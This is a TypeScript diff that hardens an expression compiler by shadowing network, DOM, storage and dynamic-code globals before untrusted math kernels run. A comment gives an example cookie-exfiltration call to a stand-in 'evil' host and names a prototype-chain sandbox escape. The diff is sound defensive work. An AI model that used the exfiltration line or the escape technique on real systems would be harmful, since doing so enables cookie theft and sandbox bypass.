@@ -304,6 +304,30 @@ function warnOnce(state: ExprState, nodeId: string): void {
   state.lastWarned = state.error;
 }
 
+// Defense-in-depth, NOT a sandbox. Expression sources can arrive from
+// untrusted places — a shared/opened project, or an AI recipe (the recipe
+// validator smoke-runs the kernel, and eval runs it per point). This block
+// shadows the network / DOM / storage / async / dynamic-code globals a
+// legitimate math kernel never needs, so a naive `fetch("//evil/"+document.cookie)`
+// throws a TypeError instead of exfiltrating silently — and the per-point
+// try/catch then fails the point safe to passthrough and logs it. This does
+// NOT stop a determined escape via prototype chains (`[].constructor.constructor`);
+// real isolation (a Worker with a time budget) is the follow-up. Math, JSON,
+// Number, String, Array, Object etc. are deliberately left reachable — kernels
+// use them. Names here must not be strict-mode-reserved (no `eval`) and must
+// not collide with ENV_KEYS or the per-point locals.
+const SHADOWED_GLOBALS = [
+  "window", "self", "globalThis", "top", "parent", "frames",
+  "document", "navigator", "location", "history", "screen",
+  "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Request", "Response",
+  "importScripts", "postMessage", "Worker", "SharedWorker",
+  "localStorage", "sessionStorage", "indexedDB", "caches", "cookieStore",
+  "setTimeout", "setInterval", "setImmediate", "requestAnimationFrame", "queueMicrotask",
+  "Function", "process", "require", "module", "exports",
+  "alert", "prompt", "confirm", "open",
+];
+const GLOBAL_SHADOW_PRELUDE = `const ${SHADOWED_GLOBALS.map((g) => `${g}=void 0`).join(",")};`;
+
 function compile(source: string): Compiled {
   const body = source.trim();
   try {
@@ -316,6 +340,7 @@ function compile(source: string): Compiled {
       "__env",
       "__pt",
       `"use strict";
+${GLOBAL_SHADOW_PRELUDE}
 const{${ENV_KEYS}}=__env;
 let index=__pt.index,count=__pt.count,groupIndex=__pt.groupIndex,px=__pt.px,py=__pt.py,rot0=__pt.rot0,sx0=__pt.sx0,sy0=__pt.sy0;
 let x=px,y=py,rot=rot0,sx=sx0,sy=sy0,scale=1,keep=true;
